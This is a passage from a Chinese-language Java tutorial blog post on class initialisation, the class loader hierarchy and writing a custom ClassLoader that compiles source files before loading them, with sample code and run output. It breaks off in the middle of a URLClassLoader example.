<li>创建类的实例。为某个类创建实例的方式包括：使用new操作符来创建实例，通过反射来创建实例，通过反序列化的方式创建实例</li>
<li>调用某个类的类方法（静态方法）。</li>
<li>访问某个类或接口的类变量，或为该类变量赋值。</li>
<li>使用反射方式强制创建某个类或接口对应的java.lang.Class对象。例如代码Class.forName(“Person”)，如果系统还未初始化Person类，则这行代码将会导致该Person类被初始化，并返回Person类对应的java.lang.Class对象。</li>
<li>初始化某个类的子类，当初始化某个类的子类时，该子类所有父类都会被初始化。</li>
<li>直接使用java命令来运行某个主类。当运行某个主类时，程序会先初始化该主类。</li>
</ul>
<p>除此之外的特殊情况：</p>
<p>对于一个final型的变量，如果该类变量的值在编译时就可以确定下来，那么这个类变量相当于“宏变量”。java编译器会在编译时直接把这个类变量出现的地方替换成它的值，因此即使程序使用静态类变量，也不会导致该类的初始化。如果在编译时不能确定的final型变量该类还是会被初始化</p>
<h2 id="2-类加载器"><a href="#2-类加载器" class="headerlink" title="2. 类加载器"></a>2. 类加载器</h2><p>类加载器负责将.class文件（可能在磁盘上，也可能在网络上）加载到内存中，并为之生成对应的java.lang.Class对象。</p>
<h3 id="2-1-类加载机制"><a href="#2-1-类加载机制" class="headerlink" title="2.1 类加载机制"></a>2.1 类加载机制</h3><p>类加载器负责加载所有的类，系统为所有被载入内存中的类生成一个java.lang.Class实例。一旦一个类被载入JVM中，同一个类就不会被载入了。怎样才算是”同一个类”？在java中，<u>一个类用其全限定类名和其类加载器作为唯一标识</u>。例如在pg的包中有一个名为Person的类，被类加载器ClassLoader的实例kl负责加载。则该Person类对应的Class对象在JVM中表示为（Person、pg、kl）。</p>
<p>当JVM启动时，会形成由三个类加载器组成的初始类加载器层次结构。</p>
<ul>
<li>Bootstrap ClassLoader: 根类加载器</li>
<li>Extension ClassLoader: 扩展类加载器</li>
<li>System ClassLoader: 系统类加载器</li>
</ul>
<p>Bootstrap ClassLoader被称为引导（也称为原始或根）类加载器，它负责加载Java的核心类。在Sum的JVM中，当执行java命令时，使用-Xbootclasspath或-D选项指定sun.boot.class.path系统属性值可以指定加载附加的类。</p>
<p>JVM的类加载机制主要有如下三种:</p>
<ul>
<li>全盘负责。所谓全盘负责，就是当一个类加载器负责加载某个Class时，该Class所依赖的和引用的其他Class也将由该类加载器负责载入，除非显式使用另外一个类加载器来载入。</li>
<li>父类委托。所谓父类委托，则是先让parent类加载器试图加载该Class,只有在父类加载器无法加载该类时才尝试从自己的类路径中加载该类。</li>
<li>缓存机制。缓存机制将会保证所有加载过的Class都会被缓存，当程序中需要使用某个Class时，类加载器先从缓存中搜寻该Class，只有当缓存区中不存在该Class对象时，系统才会读取该类对应的二进制数据，并将其转换成Class对象，存入缓存中。这就是为什么修改了Class后，必须重启JVM，程序所做的修改才会生效的原因。</li>
</ul>
<p><u>类加载器之间的父子关系并不是类继承上的父子关系，这里的父子关系是类加载器实例之间的关系</u></p>
<p>除了可以使用Java提供的类加载器之外，开发者也可以实现自己的类加载器，自定义的类加载器通过继承ClassLoader来实现，JVM中这4种类加载器的层次结构如下所示。</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">根类加载器</span>&lt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">扩展类加载器</span>&lt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">系统类加载器</span>&lt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">用户类加载器</span></span><br></pre></td></tr></table></figure>

<p>测试Demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderPropTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//获取系统类加载器</span></span><br><span class="line">        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;系统类加载器：&quot;</span> + systemClassLoader);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        获取系统类加载器的加载路径——通常通常由CLASSPATH环境变量指定，如果操作系统没有指定CLASSPATH环境变量，则默认以当前路径作为系统类</span></span><br><span class="line"><span class="comment">        加载加载器的加载路径。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Enumeration&lt;URL&gt; eml = systemClassLoader.getResources(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(eml.hasMoreElements()) &#123;</span><br><span class="line">            System.out.println(eml.nextElement());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取系统类加载器的父亲加载器，得到扩展类加载器</span></span><br><span class="line">        ClassLoader extensionLoader = systemClassLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;扩展类加载器：&quot;</span> + extensionLoader);</span><br><span class="line">        System.out.println(<span class="string">&quot;扩展类加载器的加载路径: &quot;</span> + System.getProperty(<span class="string">&quot;java.ext.dirs&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;扩展类加载器的parent: &quot;</span> + extensionLoader.getParent());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/bin/</span>java -javaagent:<span class="regexp">/Applications/</span>IntelliJ IDEA.app<span class="regexp">/Contents/</span>lib<span class="regexp">/idea_rt.jar=54220:/</span>Applications<span class="regexp">/IntelliJ IDEA.app/</span>Contents<span class="regexp">/bin -Dfile.encoding=UTF-8 -classpath /</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>charsets.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/deploy.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/cldrdata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/dnsns.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jaccess.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jfxrt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/localedata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/nashorn.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunec.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunjce_provider.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunpkcs11.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/zipfs.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>javaws.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jce.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jfr.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jfxswt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jsse.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/management-agent.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>plugin.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/resources.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>rt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>ant-javafx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>dt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>javafx-mx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>jconsole.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>packager.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>sa-jdi.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>tools.jar:<span class="regexp">/Users/</span>shadowflow<span class="regexp">/code/</span>java<span class="regexp">/test/</span>target<span class="regexp">/classes:/</span>Users<span class="regexp">/shadowflow/</span>.m2<span class="regexp">/repository/</span>javassist<span class="regexp">/javassist/</span><span class="number">3.12</span>.<span class="number">1</span>.GA/javassist-<span class="number">3.12</span>.<span class="number">1</span>.GA.jar reflect.ClassLoaderPropTest</span><br><span class="line">系统类加载器：sun.misc.Launcher<span class="variable">$AppClassLoader</span>@<span class="number">18</span>b4aac2</span><br><span class="line">file:<span class="regexp">/Users/</span>shadowflow<span class="regexp">/code/</span>java<span class="regexp">/test/</span>target<span class="regexp">/classes/</span></span><br><span class="line">扩展类加载器：sun.misc.Launcher<span class="variable">$ExtClassLoader</span>@<span class="number">610455</span>d6</span><br><span class="line">扩展类加载器的加载路径: <span class="regexp">/Users/</span>shadowflow<span class="regexp">/Library/</span>Java<span class="regexp">/Extensions:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext:<span class="regexp">/Library/</span>Java<span class="regexp">/Extensions:/</span>Network<span class="regexp">/Library/</span>Java<span class="regexp">/Extensions:/</span>System<span class="regexp">/Library/</span>Java<span class="regexp">/Extensions:/u</span>sr<span class="regexp">/lib/</span>java</span><br><span class="line">扩展类加载器的parent: null</span><br><span class="line"> </span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>从运行结果可以看出，系统类加载器的加载路径是程序运行的当前路径，扩展类加载器在jdk的/lib目录。扩展类的父类也就是根类加载器是null。这是因为根类加载器并没有继承ClassLoader抽象类，所有扩展类加载器的<code>getParent()</code>方法返回null。但实际上，扩展类加载器的父类加载器是根类加载器，只是根类加载器并不是Java实现的。</p>
<p>类加载器加载Class大致要经过如下8个步骤。</p>
<ol>
<li>检测此Class是否载入过（即在缓冲区中是否有此Class），如果有则直接进入第8步，否则接着执行第2步</li>
<li>如果父类加载器不存在（如果没有父类加载器，则要么parent一定是根类加载器，要么本身就是根类加载器），则跳到第4步执行；如果父类加载器存在，则接着第三步。</li>
<li>请求使用父类加载器去载入目标类，如果成功载入则跳到第8步，否则接着执行第5步。</li>
<li>请求使用根类加载器来载入目标类，如果成功载入则跳到第8步，否则跳到7步。</li>
<li>当前类加载器尝试寻找Class文件（从与此ClassLoader相关的类路径寻找），如果找到则执行第6步，如果找不到则跳到第7步。</li>
<li>从文件中载入Class，成功载入后跳到第8步</li>
<li>抛出ClassNotFoundException异常</li>
<li>返回对应的java.lang.Class对象。</li>
</ol>
<p>其中5、6步允许重写ClassLoader的<code>findClass()</code>方法类实现自己的载入策略，甚至重写<code>loadClass()</code>方法类实现自己的载入过程。</p>
<h3 id="2-2-创建并使用自定义的类加载器"><a href="#2-2-创建并使用自定义的类加载器" class="headerlink" title="2.2 创建并使用自定义的类加载器"></a>2.2 创建并使用自定义的类加载器</h3><p>JVM中除根类加载器之外的所有类加载器都是ClassLoader子类的实例，开发者可以通过扩展ClassLoader的子类。并重写该ClassLoader所包含的方法来实现自定义类加载器。ClassLoader中包含大量的protected方法——这些方法都可以被子类重写。</p>
<p>ClassLoader类有如下两个关键方法：</p>
<ol>
<li><p><code>loadClass(String name, boolean resolve)</code>：该方法为ClassLoader的入口点，根据指定名称来加载类，系统就是调用ClassLoader的该方法来获取指定类对应的Class对象。</p>
</li>
<li><p>findClass(String name)`: 根据指定名称来查找类。</p>
</li>
</ol>
<p>如果需要实现自定义的ClassLoader，则可以通过重写以上两个方法来实现，<font color="Red">通常推荐重写<code>findClass()</code>方法</font>而不是<code>loadClass()</code>方法。<code>loadClass()</code>方法的执行步骤如下。</p>
<ol>
<li>用<code>findLoadedClass(String)</code>来检查是否已经加载类，如果已经加载则直接返回</li>
<li>在父类加载器上调用<code>loadClass()</code>方法。如果父类加载器为null，则使用根类加载器来加载。</li>
<li>调用<code>findClass(String)</code>方法查找类。</li>
</ol>
<p>从上面的步骤可以看出，重写<code>findClass()</code>方法可以避免覆盖默认类加载器的父类委托、缓冲机制两种策略；如果重写<code>loadClass()</code>方法则实现逻辑更为复杂。</p>
<p>在ClassLoader里还有一个核心方法：Class defineClass(String name, byte[]b，int off, intlen)，该方法负责将指定类的字节码文件读入字节数组byte[] b内，并把它转化为Class对象，该字节码文件可以来源于文件、网络等。</p>
<p><code>defineClass()</code>方法管理JVM的许多复杂的实现，它负责将字节码分析成运行时数据结构，并校验有效性等。但是不用重写该方法，实际上该方法是final的，没办法重写。</p>
<p>ClassLoader还有一些普通方法。</p>
<ul>
<li><code>findSystemClass(String name)</code>: 从本地文件系统装入文件。它在本地文件系统中寻找类文件，如果存在，就使用<code>defineClass()</code>方法将原始字节转换为Class对象，以将该文件转换成类。</li>
<li><code>static getSystemClassLoader()</code>: 这是一个静态方法，用于返回系统类加载器</li>
<li><code>getParent()</code>: 获取类加载器的父类加载器。</li>
<li>resolveClass(Class&lt;?&gt; c): 链接指定的类。类加载器可以使用此方法来链接类c。</li>
<li><code>findLoadedClass(String name)</code>: 如果此Java虚拟机已经加载了名为name的类，则直接返回该类对应的Class实例，否则返回Null。该方法是Java类加载缓存机制的体现。</li>
</ul>
<p>下面的程序开发了一个自定义的ClassLoader，该ClassLoader通过重写<code>findClass()</code>来实现自定义的类加载机制。这个ClassLoader可以在加载类之前先编译该类源文件，从而实现运行Java之前先编译程序的目标，这样即可通过该ClassLoader直接运行Java源文件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect.loader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CompileClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 读取一个文件的内容</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] getBytes(String filename)</span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line">        <span class="keyword">long</span> len = file.length();</span><br><span class="line">        <span class="keyword">byte</span>[] raw = <span class="keyword">new</span> <span class="keyword">byte</span>[(<span class="keyword">int</span>) len];</span><br><span class="line">        <span class="keyword">try</span> (</span><br><span class="line">                FileInputStream fin = <span class="keyword">new</span> FileInputStream(file)) &#123;</span><br><span class="line">            <span class="comment">// 一次读取Class文件的全部二进制数据</span></span><br><span class="line">            <span class="keyword">int</span> r = fin.read(raw);</span><br><span class="line">            <span class="keyword">if</span> (r != len)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;无法读取全部文件：&quot;</span></span><br><span class="line">                        + r + <span class="string">&quot; != &quot;</span> + len);</span><br><span class="line">            <span class="keyword">return</span> raw;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义编译指定Java文件的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">compile</span><span class="params">(String javaFile)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CompileClassLoader:正在编译 &quot;</span></span><br><span class="line">                + javaFile + <span class="string">&quot;...&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用系统的javac命令</span></span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="string">&quot;javac &quot;</span> + javaFile);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 其他线程都等待这个线程完成</span></span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">            System.out.println(ie);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取javac线程的退出值</span></span><br><span class="line">        <span class="keyword">int</span> ret = p.exitValue();</span><br><span class="line">        <span class="comment">// 返回编译是否成功</span></span><br><span class="line">        <span class="keyword">return</span> ret == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写ClassLoader的findClass方法</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class clazz = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 将包路径中的点（.）替换成斜线（/）</span></span><br><span class="line">        String fileStub = name.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        String javaFilename = fileStub + <span class="string">&quot;.java&quot;</span>;</span><br><span class="line">        String classFilename = fileStub + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        File javaFile = <span class="keyword">new</span> File(javaFilename);</span><br><span class="line">        File classFile = <span class="keyword">new</span> File(classFilename);</span><br><span class="line">        <span class="comment">// 当指定Java源文件存在，且Class文件不存在，或者Java源文件</span></span><br><span class="line">        <span class="comment">// 的修改时间比Class文件的修改时间更晚时，重新编译</span></span><br><span class="line">        <span class="keyword">if</span> (javaFile.exists() &amp;&amp; (!classFile.exists()</span><br><span class="line">                || javaFile.lastModified() &gt; classFile.lastModified())) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 如果编译失败，或者该Class文件不存在</span></span><br><span class="line">                <span class="keyword">if</span> (!compile(javaFilename) || !classFile.exists()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(</span><br><span class="line">                            <span class="string">&quot;ClassNotFoundExcetpion:&quot;</span> + javaFilename);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果Class文件存在，系统负责将该文件转换成Class对象</span></span><br><span class="line">        <span class="keyword">if</span> (classFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 将Class文件的二进制数据读入数组</span></span><br><span class="line">                <span class="keyword">byte</span>[] raw = getBytes(classFilename);</span><br><span class="line">                <span class="comment">// 调用ClassLoader的defineClass方法将二进制数据转换成Class对象</span></span><br><span class="line">                clazz = defineClass(name, raw, <span class="number">0</span>, raw.length);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ie) &#123;</span><br><span class="line">                ie.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果clazz为null，表明加载失败，则抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个主方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 如果运行该程序时没有参数，即没有目标类</span></span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;缺少目标类，请按如下格式运行Java源文件：&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;java CompileClassLoader ClassName&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第一个参数是需要运行的类</span></span><br><span class="line">        String progClass = args[<span class="number">0</span>];</span><br><span class="line">        System.out.println(progClass); <span class="comment">//reflect.loader.Hello</span></span><br><span class="line">        <span class="comment">// 剩下的参数将作为运行目标类时的参数</span></span><br><span class="line">        <span class="comment">// 将这些参数复制到一个新数组中</span></span><br><span class="line">        String[] progArgs = <span class="keyword">new</span> String[args.length - <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(args, <span class="number">1</span>, progArgs</span><br><span class="line">                , <span class="number">0</span>, progArgs.length);</span><br><span class="line">        CompileClassLoader ccl = <span class="keyword">new</span> CompileClassLoader();</span><br><span class="line">        <span class="comment">// 加载需要运行的类</span></span><br><span class="line">        Class&lt;?&gt; clazz = ccl.loadClass(progClass);</span><br><span class="line">        <span class="comment">// 获取需要运行的类的主方法</span></span><br><span class="line">        Method main = clazz.getMethod(<span class="string">&quot;main&quot;</span>, (<span class="keyword">new</span> String[<span class="number">0</span>]).getClass());</span><br><span class="line">        Object argsArray[] = &#123;progArgs&#125;;</span><br><span class="line">        main.invoke(<span class="keyword">null</span>, argsArray);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的程序重写了<code>findClass()</code>方法，通过重写该方法就可以实现自定义的类加载机制。<code>findClass()</code>方法中先检查需要加载的Class文件是否存在。如果不存在则先编译文件，在调用ClassLoader的<code>defineClass()</code>方法来加载这个Class文件，并生成相应的Class对象。</p>
<p>接下来可以随意提供一个简单的主类，该类无须编译就可以使用上面的CompileClasss Loader来运行它。</p>
<p>编写如下测试类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect.loader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String arg : args) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;参数：&quot;</span> + arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先对CompileClassLoader进行编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS java]% javac reflect/loader/CompileClassLoader.java </span><br></pre></td></tr></table></figure>

<p>然后不编译Hello直接运行Hello</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS java]% java reflect.loader.CompileClassLoader reflect.loader.Hello shadotest</span><br><span class="line">reflect.loader.Hello</span><br><span class="line">CompileClassLoader:正在编译 reflect/loader/Hello.java...</span><br><span class="line">参数：shadotest</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>本示例程序提供的类加载功能比较简单，仅仅提供了在运行之前先编译Java源文件的功能，实际上，使用自定义的类加载器，可以实现如下常见功能：</p>
<ul>
<li>执行代码前自动验证数字签名</li>
<li>根据用户提供的密码解密代码，从而可以实现代码混淆器来避免反编译*.class文件。</li>
<li>根据用户需求来动态的加载类。</li>
<li>根据应用需求来把其他数据以字节码的形式加载到应用中</li>
</ul>
<h3 id="2-3-URL-ClassLoader类"><a href="#2-3-URL-ClassLoader类" class="headerlink" title="2.3 URL ClassLoader类"></a>2.3 URL ClassLoader类</h3><p>Java为ClassLoader提供了一个URLClassLoader实现类，该类也是系统类加载器和扩展类加载器的父类（此处的父类，就是指类与类之间的继承关系）。URLClassLoader功能比较强大，它既可以从本地文件系统获取二进制文件来加载类，也可以从远程主机获取二进制文件来加载类。</p>
<p>在应用程序中可以直接使用URLClassLoader加载类，URLClassLoader类提供了如下两个构造器。</p>
<ul>
<li><code>URLClassLoader(URL[] urls)</code>: 使用默认的父类加载器创建一个ClassLoader对象，该对象将从urls所指定的系列路径来查询并加载类。</li>
<li><code>URLClassLoader(URL[] urls, ClassLoader parent)</code>: 使用指定的父类加载器创建一个ClassLoader对象，其他功能与前一个构造器相同。</li>
</ul>
<p>一旦得到了URLCLassLoader对象之后，就可以调用该对象的<code>loadClass()</code>方法来加载指定类。下面程序示范了如何从文件系统中加载MySQL驱动，并使用该驱动来获取数据库连接。通过这种方式来获取数据库连接，可以无须将MySQL驱动添加到CLASSPATH环境变量中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect.loader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.Driver;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Connection conn;</span><br><span class="line">    <span class="comment">//定义一个获取数据库连接的方法</span></span><br><span class="line">    <span class="function"><span 